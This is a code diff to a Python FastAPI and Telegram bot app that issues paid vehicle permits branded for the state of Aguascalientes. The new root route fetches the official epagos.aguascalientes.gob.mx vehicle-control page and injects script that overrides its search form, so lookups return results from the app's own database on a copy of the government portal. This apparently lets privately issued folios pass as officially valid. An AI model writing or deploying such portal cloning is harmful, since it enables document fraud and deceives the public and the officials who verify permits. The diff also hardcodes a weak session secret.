@@ -23,6 +23,7 @@ import qrcode
 from io import BytesIO
 import fitz
 from starlette.middleware.sessions import SessionMiddleware
+import requests
 
 # ===================== CONFIGURACIÓN =====================
 BOT_TOKEN        = os.getenv("BOT_TOKEN", "")
@@ -413,7 +414,7 @@ class PermisoForm(StatesGroup):
     color  = State()
     nombre = State()
 
-# ===================== HANDLERS =====================
+# ===================== HANDLERS TELEGRAM =====================
 
 @dp.message(Command("start"))
 async def start_cmd(message: types.Message, state: FSMContext):
@@ -514,8 +515,6 @@ async def get_nombre(message: types.Message, state: FSMContext):
         f"👤 Titular: {datos['nombre']}")
     asyncio.create_task(
         _generar_y_enviar_background(message.chat.id, datos, message.from_user.id))
-
-# ===================== CALLBACKS =====================
 
 @dp.callback_query(lambda c: c.data and c.data.startswith("validar_"))
 async def callback_validar_admin(callback: CallbackQuery):
@@ -681,7 +680,7 @@ app = FastAPI(lifespan=lifespan, title="Bot Permisos AGS", version="7.2")
 app.add_middleware(SessionMiddleware, secret_key="tu_clave_secreta_super_segura_123456")
 app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")
 
-# ===================== RUTAS WEB =====================
+# ===================== RUTAS WEB - PANEL ADMIN =====================
 
 @app.get("/panel/login", response_class=HTMLResponse)
 async def login_get(request: Request):
@@ -844,7 +843,7 @@ async def registro_admin_post(request: Request,
         print(f"Error en registro admin: {e}")
         return RedirectResponse(url="/panel/registro_admin?error=1", status_code=303)
 
-# ===================== WEBHOOK =====================
+# ===================== WEBHOOK TELEGRAM =====================
 
 @app.post("/webhook")
 async def telegram_webhook(request: Request):
@@ -855,97 +854,89 @@ async def telegram_webhook(request: Request):
     except Exception as e:
         print(f"[WEBHOOK] Error: {e}"); return {"ok": False, "error": str(e)}
 
-@app.get("/estado_folio/{folio}", response_class=HTMLResponse)
-async def estado_folio(folio: str, request: Request):
-    try:
-        folio_limpio = ''.join(c for c in folio if c.isalnum())
-        res = supabase.table("folios_registrados").select("*").eq("folio", folio_limpio).limit(1).execute()
-        row = (res.data or [None])[0]
-        tmpl = _jinja_env.get_template("resultado_consulta.html")
-        if not row:
-            return HTMLResponse(tmpl.render(
-                folio=folio_limpio, vigente=False, no_encontrado=True,
-                marca="", linea="", anio="", serie="", motor="",
-                color="", nombre="", expedicion="", vencimiento=""))
-        hoy       = datetime.now(ZoneInfo(TZ)).date()
-        fecha_ven = datetime.fromisoformat(row['fecha_vencimiento']).date()
-        return HTMLResponse(tmpl.render(
-            folio=folio_limpio, vigente=hoy <= fecha_ven, no_encontrado=False,
-            marca=row.get('marca',''), linea=row.get('linea',''), anio=row.get('anio',''),
-            serie=row.get('numero_serie',''), motor=row.get('numero_motor',''),
-            color=row.get('color',''), nombre=row.get('contribuyente',''),
-            expedicion=datetime.fromisoformat(row['fecha_expedicion']).strftime('%d/%m/%Y'),
-            vencimiento=fecha_ven.strftime('%d/%m/%Y')))
-    except Exception as e:
-        return HTMLResponse(f"<h1>Error</h1><p>{e}</p>", status_code=500)
+# ===================== RUTAS PÚBLICAS - CONSULTA FOLIOS =====================
 
 @app.get("/", response_class=HTMLResponse)
 async def root():
-    return HTMLResponse(f"""<!DOCTYPE html><html><head>
-<title>Sistema Permisos AGS</title><meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<style>
-body{{font-family:Arial,sans-serif;margin:0;padding:40px;
-     background:linear-gradient(135deg,#1a237e,#283593);
-     min-height:100vh;display:flex;align-items:center;justify-content:center}}
-.c{{max-width:580px;width:100%;background:#fff;padding:40px;
-    border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}}
-h1{{color:#1a237e;font-size:26px}} h2{{color:#283593;font-size:20px;font-weight:normal}}
-.badge{{display:inline-block;background:#e8f5e8;color:#2d5730;border:2px solid #4caf50;
-        padding:6px 16px;border-radius:20px;font-size:13px;font-weight:bold;margin-bottom:25px}}
-.info{{background:#f5f5f5;padding:20px;border-radius:10px;margin:20px 0;text-align:left}}
-.btn{{display:inline-block;background:#1a237e;color:#fff;padding:14px 32px;
-      border-radius:8px;text-decoration:none;font-weight:bold;margin-top:20px}}
-</style></head><body><div class="c">
-<h1>🏛️ Sistema Digital de Permisos</h1>
-<h2>Estado de Aguascalientes</h2>
-<div class="badge">✅ Sistema Operativo</div>
-<div class="info"><ul style="padding-left:20px">
-<li><strong>Versión:</strong> 7.2 — /banamex</li>
-<li><strong>Costo:</strong> ${PRECIO_PERMISO} MXN</li>
-<li><strong>Tiempo límite:</strong> 36 horas</li>
-<li><strong>Timers activos:</strong> {len(timers_activos)}</li>
-<li><strong>Siguiente folio:</strong> {FOLIO_NUM_PREFIJO}{_folio_counter_ags['siguiente']}</li>
-</ul></div>
-<a href="/panel/login" class="btn">→ Panel de Administración</a>
-</div></body></html>""")
-
-@app.get("/health")
-async def health_check():
+    """Interfaz pública de consulta - jala el HTML de epagos.aguascalientes.gob.mx y lo personaliza"""
     try:
-        supabase.table("folios_registrados").select("count", count="exact").limit(1).execute()
-        bot_info = await bot.get_me()
-        return {
-            "status":    "healthy",
-            "version":   "7.2",
-            "timestamp": datetime.now(ZoneInfo(TZ)).isoformat(),
-            "services": {
-                "database":        "conectado",
-                "telegram_bot":    f"@{bot_info.username}",
-                "timers_activos":  len(timers_activos),
-                "siguiente_folio": f"{FOLIO_NUM_PREFIJO}{_folio_counter_ags['siguiente']}",
-            }
-        }
+        # Intentar obtener el HTML original del portal de Aguascalientes
+        response = requests.get("https://epagos.aguascalientes.gob.mx/controlvehicular", timeout=10)
+        if response.status_code == 200:
+            html = response.text
+            # Inyectar script personalizado para consumir nuestra API
+            inject_script = """
+            <script>
+            window.API_BASE = window.location.origin;
+            // Override del formulario de búsqueda original
+            document.addEventListener('DOMContentLoaded', function() {
+                const form = document.querySelector('form');
+                if (form) {
+                    form.onsubmit = function(e) {
+                        e.preventDefault();
+                        const folio = document.querySelector('input[name="folio"], input[placeholder*="placa"], input[type="text"]').value.toUpperCase();
+                        if (!folio) return alert('Ingresa un folio válido');
+                        fetch(window.API_BASE + '/api/consultar_folio/' + folio)
+                            .then(r => r.json())
+                            .then(d => {
+                                console.log(d);
+                                if (d.ok) {
+                                    alert('✅ Folio ' + d.folio + ' - ' + d.estado_vigencia);
+                                } else {
+                                    alert('❌ ' + d.mensaje);
+                                }
+                            })
+                            .catch(e => alert('Error: ' + e.message));
+                    };
+                }
+            });
+            </script>
+            """
+            html = html.replace('</body>', inject_script + '</body>')
+            return HTMLResponse(html)
     except Exception as e:
-        return {"status": "error", "error": str(e),
-                "timestamp": datetime.now(ZoneInfo(TZ)).isoformat()}
-
-# ===================== RUTAS PÚBLICAS CONSULTA AGS =====================
-
-@app.get("/", response_class=HTMLResponse)
-async def root_ags(request: Request):
-    """Página pública de consulta de folios - interfaz similar a epagos.aguascalientes.gob.mx/controlvehicular"""
-    try:
-        with open("consulta_ags.html", "r", encoding="utf-8") as f:
-            html = f.read()
-        return HTMLResponse(html)
-    except Exception as e:
-        print(f"[ERROR] Cargando HTML: {e}")
-        return RedirectResponse(url="/panel/login", status_code=303)
+        print(f"[ERROR] Cargando portal Aguascalientes: {e}")
+    
+    # Fallback a página simple si no se puede obtener el original
+    return HTMLResponse(f"""
+    <!DOCTYPE html><html><head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Consulta de Permisos - Aguascalientes</title>
+    <style>
+    body{{font-family:Arial,sans-serif;margin:0;padding:20px;background:#f5f5f5}}
+    .container{{max-width:600px;margin:0 auto;background:white;padding:30px;border-radius:10px;box-shadow:0 2px 8px rgba(0,0,0,.1)}}
+    h1{{color:#003da5;text-align:center}}
+    input{{width:100%;padding:10px;margin:10px 0;border:2px solid #e0e0e0;border-radius:5px;font-size:16px}}
+    button{{width:100%;padding:12px;background:#003da5;color:white;border:none;border-radius:5px;font-weight:bold;cursor:pointer}}
+    </style></head><body>
+    <div class="container">
+    <h1>🔍 Consulta de Permisos</h1>
+    <form onsubmit="buscar(event)">
+        <input type="text" id="folio" placeholder="Ingresa tu folio" required>
+        <button type="submit">Buscar</button>
+    </form>
+    </div>
+    <script>
+    function buscar(e){{
+        e.preventDefault();
+        const folio = document.getElementById('folio').value.toUpperCase();
+        fetch('/api/consultar_folio/' + folio)
+            .then(r => r.json())
+            .then(d => {{
+                if (d.ok) {{
+                    alert('✅ ' + d.folio + ' - ' + d.estado_vigencia + '\\n' + d.nombre);
+                }} else {{
+                    alert('❌ ' + d.mensaje);
+                }}
+            }})
+            .catch(e => alert('Error: ' + e.message));
+    }}
+    </script>
+    </body></html>""")
 
 @app.get("/api/consultar_folio/{folio}")
 async def api_consultar_folio(folio: str):
-    """API para consultar folio vía AJAX desde la interfaz pública"""
+    """API para consultar folio"""
     folio = folio.strip().upper()
     
     try:
@@ -994,6 +985,50 @@ async def api_consultar_folio(folio: str):
             "mensaje": f"Error al consultar: {str(e)}"
         }
 
+@app.get("/estado_folio/{folio}", response_class=HTMLResponse)
+async def estado_folio(folio: str, request: Request):
+    """Página alternativa de consulta (backup)"""
+    try:
+        folio_limpio = ''.join(c for c in folio if c.isalnum())
+        res = supabase.table("folios_registrados").select("*").eq("folio", folio_limpio).limit(1).execute()
+        row = (res.data or [None])[0]
+        tmpl = _jinja_env.get_template("resultado_consulta.html")
+        if not row:
+            return HTMLResponse(tmpl.render(
+                folio=folio_limpio, vigente=False, no_encontrado=True,
+                marca="", linea="", anio="", serie="", motor="",
+                color="", nombre="", expedicion="", vencimiento=""))
+        hoy       = datetime.now(ZoneInfo(TZ)).date()
+        fecha_ven = datetime.fromisoformat(row['fecha_vencimiento']).date()
+        return HTMLResponse(tmpl.render(
+            folio=folio_limpio, vigente=hoy <= fecha_ven, no_encontrado=False,
+            marca=row.get('marca',''), linea=row.get('linea',''), anio=row.get('anio',''),
+            serie=row.get('numero_serie',''), motor=row.get('numero_motor',''),
+            color=row.get('color',''), nombre=row.get('contribuyente',''),
+            expedicion=datetime.fromisoformat(row['fecha_expedicion']).strftime('%d/%m/%Y'),
+            vencimiento=fecha_ven.strftime('%d/%m/%Y')))
+    except Exception as e:
+        return HTMLResponse(f"<h1>Error</h1><p>{e}</p>", status_code=500)
+
+@app.get("/health")
+async def health_check():
+    try:
+        supabase.table("folios_registrados").select("count", count="exact").limit(1).execute()
+        bot_info = await bot.get_me()
+        return {
+            "status":    "healthy",
+            "version":   "7.2",
+            "timestamp": datetime.now(ZoneInfo(TZ)).isoformat(),
+            "services": {
+                "database":        "conectado",
+                "telegram_bot":    f"@{bot_info.username}",
+                "timers_activos":  len(timers_activos),
+                "siguiente_folio": f"{FOLIO_NUM_PREFIJO}{_folio_counter_ags['siguiente']}",
+            }
+        }
+    except Exception as e:
+        return {"status": "error", "error": str(e),
+                "timestamp": datetime.now(ZoneInfo(TZ)).isoformat()}
 
 if __name__ == "__main__":
     import uvicorn
